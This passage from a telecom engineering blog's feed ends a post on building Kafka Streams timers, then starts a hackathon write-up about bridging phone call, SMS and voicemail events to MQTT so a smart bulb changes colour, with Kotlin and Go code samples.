class="token-line" style="color:#bfc7d5"><span class="token plain">    Thread.sleep(200)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="futures">Futures<a class="hash-link" href="#futures" title="Direct link to heading">​</a></h3><p>When requesting a timer by pushing <em>timer-request</em> topic, the user provides a callback structure
used to dispatch timer event:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">message Future {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    string callBackTopic = 1;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    string callBackKey = 2;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    bytes callBack = 3;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Joining two streams on the key equal to the UNIX second will give all expired timers, and
their callback coordinates.</p><p>First, setup a join with <em>WINDOW_SIZE</em> large enough to cover the longest timer duration</p><div class="language-kotlin codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-kotlin codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">val oscillator = builder.stream&lt;String, String&gt;("oscillator")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">val timerRequest = builder.stream("timer-request", Consumed.with(Serdes.String(), FutureSerde()))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">val timeoutEvents =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    oscillator.join(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            timerRequest,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            { _: String?, future: Future -&gt; future },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            JoinWindows.of(WINDOW_SIZE),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            StreamJoined.with(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Serdes.String(),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Serdes.String(),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    FutureSerde()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            ).withThisStoreSupplier(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Stores.persistentWindowStore(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            "join-this-store",</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE.plusMinutes(30),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            ).withOtherStoreSupplier(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Stores.persistentWindowStore(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            "join-other-store",</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE.plusMinutes(30),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    )</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Second, kick of the processing loop looking for expired timers</p><div class="language-kotlin codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-kotlin codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">timeoutEvents.process(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ProcessorSupplier {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            object : Processor&lt;String, Future&gt; {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                override fun init(context: ProcessorContext) {}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                override fun process(key: String, value: Future) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    KafkaProducers.send(Topic.valueOf(value.callBackTopic),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            value.callBackKey,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            value.callBack.toByteArray()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Metrics.timerFired(value.callBackTopic)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                override fun close() {}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="cancelling-a-timer">Cancelling a timer<a class="hash-link" href="#cancelling-a-timer" title="Direct link to heading">​</a></h3><p>There is no way to cancel these timers as events can't be easily removed from the Kafka stream.
Still, it is possible to ignore timer events by using a token in callback request, and a variable
in timer receiver state. When scheduling a timer the receiver puts the same token in two places:</p><ul><li>callback struct it publishes on the <em>timer-request</em> topic</li><li>internal variable timerToken</li></ul><p>As timer fires receiver compares value in timerToken and in the callback event. Based on the result it
draws a conclusion if timer is to be ignored or not. All it has to do to cancel a timer is to reset
value in its timerToken variable.</p><p>Since normally Kafka does "at least once" delivery it is a good idea to reset the timerToken immediately
after notification event.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-to-worry-about">What to worry about<a class="hash-link" href="#what-to-worry-about" title="Direct link to heading">​</a></h3><p>Kafka streams library is using local disk storage to keep the cache. The storage shall be large enough to host
all timer requests based on the product of <em>timer-request</em> topic retention, callback size and timer scheduling rate.
Thankfully Kafka is well-equipped to deal with this sort of troubles.</p><p>Oscillator must keep ticking otherwise timers will stop coming. Make sure to have
metrics/alarms in place to stay on top of Oscillator health. Deploy few of them for redundancy having in
mind the extra load they will generate on timer users.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>There are many options to export application state to the data tier layer. Timers are often part of that
state. Above we showed how to apply Kafka primitives to achieve a goal of making application "stateless" even
if the state is using timers. It has its costs and benefits.</p><p>Check out openings on the <a href="/jp/careers/">Careers page</a> if you’re interested in building the future Telco backbone.</p>]]></content:encoded>
            <category>kafka</category>
            <category>timer</category>
            <category>stateless</category>
        </item>
        <item>
            <title><![CDATA[Changing the color of your bulbs: The fancy way]]></title>
            <link>https://www.wgtwo.com/jp/blog/mqtt-event-bridge</link>
            <guid>mqtt-event-bridge</guid>
            <pubDate>Thu, 07 Jan 2021 00:00:00 GMT</pubDate>
            <description><![CDATA[last hackathon i did setup a mqtt integration towards wgtwo's apis to enable call notifications via my ikea trådfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.]]></description>
            <content:encoded><![CDATA[<p>last hackathon i did setup a mqtt integration towards <strong>wgtwo</strong>'s apis to enable call notifications via my ikea trådfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.</p><p><img loading="lazy" src="/jp/assets/images/animation-0c11cc8b3879ebb39b1d24e3a5064e2c.webp" width="600" height="450" class="img_ev3q"></p><hr><p>There are a variety of events generated by <strong>wgtwo</strong>’s systems for subscriptions on the platform. This includes information such as call events, SMS sent to and from a subscription (including content), voicemail events, location events, and more.</p><p>We offer a <a href="https://docs.wgtwo.com/events/listen-for-events/" target="_blank" rel="noopener noreferrer">gRPC API</a> which enables developers to listen to a selection of these events.</p><p>I wanted to make a super simple setup so that I could configure home automation rules, e.g. <strong>"If someone calls me, make my IKEA bulb change color to notify me"</strong> or <strong>"If I send myself a SMS with 'Leaf ON', turn on the heater in my car"</strong>.</p><p>A lot of home automation tools, such as Node-RED and Home Assistant have great MQTT support, so instead of writing a native gRPC integration I wanted to make a more flexible solution by offering these events over MQTT. This way, anyone using a home automation tool with MQTT support can integrate with our platform easily.</p><p>During our last hackathon I built a simple bridge between our events API and MQTT. I wrote this bridge in Go, using <a href="https://github.com/mochi-co/mqtt" target="_blank" rel="noopener noreferrer">Mochi MQTT</a> as an embedded MQTT server.</p><p>The flow is shown in this sketch:
<img loading="lazy" src="/jp/assets/images/sketch-8ae1c400a05f7ec61c39047a01f21288.svg" width="2567" height="765" class="img_ev3q"></p><p>The way it works is quite simple: You log in to the service using our OAuth solution. You then grant the service access to fetch events on your behalf. The service will then generate a username and password for you.</p><p>The service will fetch events for all subscribers that have enabled it and publish these to the MQTT server with topic <code>{phone number}/events/{type}</code>. With the generated credentials, you may then subscribe to these events.</p><p>Note that nothing of this requires any setup on your phone, so it would work equally well on a 20-30 year old Nokia phone.</p><p>As I'll explain in more detail below, I did setup a quick Node-RED flow to consume these events as shown in the video below:</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="video">Video<a class="hash-link" href="#video" title="Direct link to heading">​</a></h2><video width="100%" controls=""><source src="/jp/assets/medias/calling-c705f71e862ebe9c9611db0cf4d5244e.mp4" type="video/mp4">Your browser does not support the video tag.</video><p>Here you can see that:</p><ol><li>The light changes to cool white when the call is initiated (phone not yet ringing)</li><li>It turns pink when the phone is ringing</li><li>It turns red when we pick up the call</li><li>It returns to normal after the call has ended</li></ol><h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-wgtwos-api">Connecting to <strong>wgtwo</strong>'s API<a class="hash-link" href="#connecting-to-wgtwos-api" title="Direct link to heading">​</a></h2><p>We will use a normal OAuth2 authorization code grant for logging in to our service.</p><p>To handle this, we used the module <code>github.com/markbates/goth</code> with the following settings:</p><div class="language-go codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-go codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token keyword" style="font-style:italic">import</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"golang.org/x/oauth2"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">const</span><span class="token plain"> endpointProfile </span><span class="token builtin" style="color:rgb(130, 170, 255)">string</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"https://id.wgtwo.com/userinfo"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">var</span><span class="token plain"> Endpoint </span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token plain"> oauth2</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">Endpoint</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  AuthURL</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">  </span><span class="token string" style="color:rgb(195, 232, 141)">"https://id.wgtwo.com/oauth2/auth"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  TokenURL</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"https://id.wgtwo.com/oauth2/token"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When logging in, the user will be asked to consent to the following scopes:</p><ul><li>phone: Allowing the service to fetch the user’s phone number</li><li>offline_access: Giving the service a refresh token</li><li>events.voice.subscribe: Allow the service to see all call events</li><li>events.voicemail.subscribe: Allow the service to see if a voicemail has been left</li><li>events.sms.subscribe: Allow the service to get a copy of every SMS sent and received</li></ul><p>All the events you have consented to share with the service will be stored in the service's queue.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">sms events        ─╮</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">voice events      ─┼─▷  queue  ◁── gRPC API</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">voice mail events ─╯</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This queue can be consumed by using the events streaming API (<a href="https://docs.wgtwo.com/events/listen-for-events/" target="_blank" rel="noopener noreferrer">docs</a>), which requires the service to use the OAuth2 client credentials grant flow.</p><p>Events will be shared with the service as long as there exists an active consent.</p><p>We then initiate the server side stream to fetch the events:</p><div class="language-go codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-go codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">request </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">&amp;</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SubscribeEventsRequest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  Type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">          </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">EventType</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">EventType_VOICEMAIL_EVENT</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  StartPosition</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">&amp;</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SubscribeEventsRequest_StartAtOldestPossible</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ClientId</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">      uuid</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">New</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">String</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  QueueName</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">     </span><span class="token string" style="color:rgb(195, 232, 141)">"wgtwo-mqtt-demo"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  DurableName</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">   </span><span class="token string" style="color:rgb(195, 232, 141)">"wgtwo-mqtt-demo"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  MaxInFlight</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">   </span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ManualAck</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">&amp;</span><span class="token plain">pb</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">ManualAckConfig</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     Enable</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain">  </span><span class="token boolean" style="color:rgb(255, 88, 116)">true</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     Timeout</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> ptypes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">DurationProto</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">10</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">*</span><span class="token plain"> time</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">Second</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">r</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">Subscribe</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">TODO</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> request</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">for</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  response</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token function" style="color:rgb(130, 170, 255)">Recv</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">if</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">==</span><span class="token plain"> io</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">EOF </span><span class="token operator" style="color:rgb(137, 221, 255)">||</span><span class="token plain"> err </span><span class="token operator" style="color:rgb(137, 221, 255)">!=</span><span class="token plain"> </span><span class="token boolean" style="color:rgb(255, 88, 116)">nil</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     </span><span class="token keyword" style="font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  event </span><span class="token operator" style="color:rgb(137, 221, 255)">:=</span><span class="token plain"> response</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">Event</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">// PUBLISH EVENT TO MQTT SERVER ON TOPIC {event owner}/events/{type}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-our-new-mqtt-service">Connecting to our new MQTT service<a class="hash-link" href="#connecting-to-our-new-mqtt-service" title="Direct link to heading">​</a></h2><p>The service has a very pretty landing page (Disclaimer: I am not a designer).</p><p><img loading="lazy" alt="landing page" 